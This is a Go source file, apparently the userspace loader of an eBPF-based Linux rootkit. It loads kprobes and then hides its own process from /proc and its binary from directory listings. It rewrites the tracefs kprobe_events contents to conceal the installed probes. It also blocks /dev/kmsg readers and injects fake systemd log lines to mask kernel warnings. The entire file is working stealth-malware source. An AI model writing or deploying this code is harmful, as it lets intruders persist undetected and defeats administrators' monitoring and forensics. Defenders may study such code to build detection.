package hidden

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/moby/sys/mountinfo"

	"github.com/DataDog/ebpf"
	"github.com/DataDog/ebpf/manager"
)

func (rk *RkHidden) ParseMountInfo(pid int32) ([]*mountinfo.Info, error) {
	f, err := os.Open(fmt.Sprintf("/proc/%d/mountinfo", pid))
	if err != nil {
		return nil, err
	}
	defer f.Close()

	return mountinfo.GetMountsFromReader(f, nil)
}

func (rk *RkHidden) GetRkFdKeys(path string) []RkFdKey {
	matches, err := filepath.Glob("/proc/*/fd/*")
	if err != nil {
		return nil
	}

	var keys []RkFdKey
	for _, match := range matches {
		if f, err := os.Readlink(match); err == nil {
			if f == path {
				fd, err := strconv.ParseInt(filepath.Base(match), 10, 64)
				if err != nil {
					continue
				}

				els := strings.Split(match, "/")
				pid, err := strconv.ParseInt(els[2], 10, 64)
				if err != nil {
					continue
				}

				keys = append(keys, RkFdKey{
					Fd:  uint64(fd),
					Pid: uint32(pid),
				})
			}
		}
	}

	return keys
}

type RkHidden struct {
	Pid int

	Options         manager.Options
	MainManager     *manager.Manager
	OverrideManager *manager.Manager

	KprobeEvents []byte

	HandleError func(err error)

	pathAttr map[RkPathKey]RkPathAttr
}

func (rk *RkHidden) Kmsg(str string) {
	f, err := os.OpenFile("/dev/kmsg", os.O_WRONLY|os.O_APPEND, os.ModePerm)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(str)
}

func (rk *RkHidden) PutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
	key := RkFdContentKey{
		ID: id,
	}

	for {
		RkFdContent := RkFdContent{}

		n, err := reader.Read(RkFdContent.Content[:])
		if err != nil {
			return
		}

		if n == 0 {
			break
		}

		RkFdContent.Size = uint64(n)

		if err := m.Put(key.Bytes(), RkFdContent.Bytes()); err != nil {
			return
		}

		key.Chunk++
	}
}

func (rk *RkHidden) PutPathAttr(m *ebpf.Map, path string, attr RkPathAttr, override bool) {
	var zeroAttr RkPathAttr

	for i, key := range RkPathKeys(path) {
		if i == 0 {
			if !override {
				prev, ok := rk.pathAttr[key]
				if ok {
					attr.Action = attr.Action | prev.Action
					attr.ReturnValue = attr.ReturnValue | prev.ReturnValue
					attr.HiddenHash = attr.HiddenHash | prev.HiddenHash
				}
			}

			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
				rk.HandleError(err)
			}

			rk.pathAttr[key] = attr
		} else {
			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
				rk.HandleError(err)
			}
		}
	}
}

func (rk *RkHidden) BlockKmsg() []RkFdKey {
	rkFdKeys := rk.GetRkFdKeys("/dev/kmsg")

	filesMap, _, err := rk.MainManager.GetMap("rk_fd_attrs")
	if err != nil {
		HandleError(err)
		return nil
	}

	// block process already having fd on kmsg
	for _, fdKey := range rkFdKeys {
		fdAttr := RkFdAttr{
			Action: OverrideReturn,
		}

		if err = filesMap.Put(fdKey.Bytes(), fdAttr.Bytes()); err != nil {
			rk.HandleError(err)
		}
	}

	// block process that will open kmsg
	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
	attr := RkPathAttr{
		FSType: "devtmpfs",
		Action: OverrideReturn,
	}
	rk.PutPathAttr(pathKeysMap, "kmsg", attr, true)

	// send fake message to force the processes to read and to exit
	rk.Kmsg("systemd[1]: Resync Network Time Service.")

	return rkFdKeys
}

func (rk *RkHidden) UnBlockKsmg(rkFdKeys []RkFdKey) {
	filesMap, _, err := rk.MainManager.GetMap("rk_fd_attrs")
	if err != nil {
		rk.HandleError(err)
		return
	}

	// unblock
	for _, RkFdKey := range rkFdKeys {
		filesMap.Delete(RkFdKey.Bytes())
	}
}

func (rk *RkHidden) OverrideContent(fsType string, path string, reader io.Reader) {
	id := FNVHashStr(fsType + "/" + path)

	attr := RkPathAttr{
		FSType:     "tracefs",
		Action:     OverrideContent,
		OverrideID: id,
	}

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
	rk.PutPathAttr(pathKeysMap, path, attr, false)

	contentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
	rk.PutFdContent(contentsMap, id, reader)
}

func (rk *RkHidden) OverrideReturn(fsType string, path string, value int64) {
	attr := RkPathAttr{
		FSType:      fsType,
		Action:      OverrideReturn,
		ReturnValue: value,
	}

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
	rk.PutPathAttr(pathKeysMap, path, attr, false)
}

func (rk *RkHidden) HideFile(fsType string, dir string, file string) {
	attr := RkPathAttr{
		FSType:     fsType,
		Action:     HideFile,
		HiddenHash: FNVHashStr(file),
	}

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
	rk.PutPathAttr(pathKeysMap, dir, attr, false)

	rk.OverrideReturn(fsType, path.Join(dir, file), -2)
}

func (rk *RkHidden) HideMyself() {
	fi, err := os.Stat(fmt.Sprintf("/proc/%d/exe", rk.Pid))
	if err != nil {
		rk.HandleError(err)
		return
	}

	stat, ok := fi.Sys().(*syscall.Stat_t)
	if !ok {
		return
	}

	infos, err := rk.ParseMountInfo(int32(rk.Pid))
	if err != nil {
		rk.HandleError(err)
		return
	}

	for _, info := range infos {
		if int32(info.Major)<<8|int32(info.Minor) == int32(stat.Dev) {
			exe, _ := os.Executable()
			dir, file := path.Split(strings.TrimPrefix(exe, info.Mountpoint))

			rk.HideFile(info.FSType, dir, file)
		}
	}
}

func (rk *RkHidden) FillKmsg() {
	file, err := os.Open("/dev/kmsg")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	var strs []string

	scanner := bufio.NewScanner(file)
	// optionally, resize scanner's capacity for lines over 64K, see next example
	for scanner.Scan() {
		els := strings.Split(scanner.Text(), ";")
		if len(els) < 2 {
			continue
		}
		txt := els[1]

		if len(txt) >= 100 {
			continue
		}

		if strings.Contains(txt, " port") ||
			strings.Contains(txt, "IPV6") ||
			strings.Contains(txt, " renamed") ||
			strings.Contains(txt, "xfs") || strings.Contains(txt, "ext4") ||
			strings.Contains(txt, "EXT4-fs") || strings.Contains(txt, "Btrfs") ||
			strings.Contains(txt, "systemd") {
			strs = append(strs, txt+"\n")
		}

		if len(strs) == 30 {
			break
		}
	}

	if len(strs) < 30 {
		for i := 0; i != 30-len(strs); i++ {
			strs = append(strs, "systemd[1]: Reached target Sockets.")
			if len(strs) == 30 {
				break
			}
		}
	}

	kmsgMap, _, _ := rk.MainManager.GetMap("rk_kmsg")
	for i, str := range strs {
		k := make([]byte, 4)
		ByteOrder.PutUint32(k, uint32(i))

		d := make([]byte, 112)
		ByteOrder.PutUint64(d, uint64(len(str)))
		copy(d[8:], []byte(str))

		if err := kmsgMap.Put(k, d); err != nil {
			rk.HandleError(err)
		}
	}
}

func (rk *RkHidden) InitOverride() {
	rkFilesMap, _, _ := rk.MainManager.GetMap("rk_files")
	rkFdAttrsMap, _, _ := rk.MainManager.GetMap("rk_fd_attrs")
	rkFdContentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
	rkGetdentsMap, _, _ := rk.MainManager.GetMap("rk_getdents")
	rkKmsgMap, _, _ := rk.MainManager.GetMap("rk_kmsg")

	rk.Options.MapEditors = map[string]*ebpf.Map{
		"rk_files":       rkFilesMap,
		"rk_fd_attrs":    rkFdAttrsMap,
		"rk_fd_contents": rkFdContentsMap,
		"rk_getdents":    rkGetdentsMap,
		"rk_kmsg":        rkKmsgMap,
	}
	rk.Options.TailCallRouter = []manager.TailCallRoute{
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(FillWithZeroProg),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/fill_with_zero",
			},
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideGetDents),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/override_getdents",
			},
		},
	}

	if err := rk.OverrideManager.InitWithOptions(overrideAsset(), rk.Options); err != nil {
		rk.HandleError(err)
	}

	// start the override manager
	if err := rk.OverrideManager.Start(); err != nil {
		rk.HandleError(err)
	}

	// update main tail call with the ones from user
	kmsgProg, _, _ := rk.OverrideManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
	overrideContentProg, _, _ := rk.OverrideManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_content"})
	overrideGetDents, _, _ := rk.OverrideManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_getdents"})
	routes := []manager.TailCallRoute{
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(KMsgProg),
			Program:       kmsgProg[0],
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideContentProg),
			Program:       overrideContentProg[0],
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideGetDents),
			Program:       overrideGetDents[0],
		},
	}
	rk.MainManager.UpdateTailCallRoutes(routes...)

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")

	// kmsg override
	rk.FillKmsg()
	attr := RkPathAttr{
		FSType: "devtmpfs",
		Action: KMsgProg,
	}
	rk.PutPathAttr(pathKeysMap, "kmsg", attr, true)

	// kprobe_events override
	rk.OverrideContent("tracefs", "kprobe_events", bytes.NewReader(rk.KprobeEvents))

	// proc override
	rk.HideFile("proc", "", strconv.Itoa(rk.Pid))

	// hide the binary itself
	rk.HideMyself()
}

func (rk *RkHidden) getRkHash() uint64 {
	exe, _ := os.Executable()
	return FNVHashStr(path.Base(exe))
}

func (rk *RkHidden) Start() {

	rk.Options = manager.Options{
		DefaultKProbeMaxActive: 512,
		DefaultProbeRetry:      2,
		DefaultProbeRetryDelay: time.Second,
		ConstantEditors: []manager.ConstantEditor{
			{
				Name:  "rk_pid",
				Value: uint64(rk.Pid),
			},
			{
				Name:  "rk_hash",
				Value: rk.getRkHash(),
			},
		},
	}

	// before loading kprobes save previous state of kprobe_events
	file, err := os.Open("/sys/kernel/debug/tracing/kprobe_events")
	if err == nil {
		defer file.Close()
		rk.KprobeEvents, _ = ioutil.ReadAll(file)
	}

	// initialize the main manager
	if err := rk.MainManager.InitWithOptions(mainAsset(), rk.Options); err != nil {
		HandleError(err)
	}

	// start the manager
	if err := rk.MainManager.Start(); err != nil {
		HandleError(err)
	}

	// before overriding block kmsg warnings
	rkFdKeys := rk.BlockKmsg()

	// now we can override
	rk.InitOverride()

	// unblock kmsg
	rk.UnBlockKsmg(rkFdKeys)

	exe, _ := os.Executable()
	fmt.Printf("Started %s\n", exe)
}

func (rk *RkHidden) Stop() {
	if err := rk.MainManager.Stop(manager.CleanAll); err != nil {
		rk.HandleError(err)
	}

	if err := rk.OverrideManager.Stop(manager.CleanAll); err != nil {
		rk.HandleError(err)
	}
}

func NewRkHidden() *RkHidden {
	return &RkHidden{
		Pid:             os.Getpid(),
		MainManager:     &manager.Manager{Probes: MainProbes},
		OverrideManager: &manager.Manager{Probes: OverrideProbes},
		HandleError:     HandleError,
		pathAttr:        make(map[RkPathKey]RkPathAttr),
	}
}
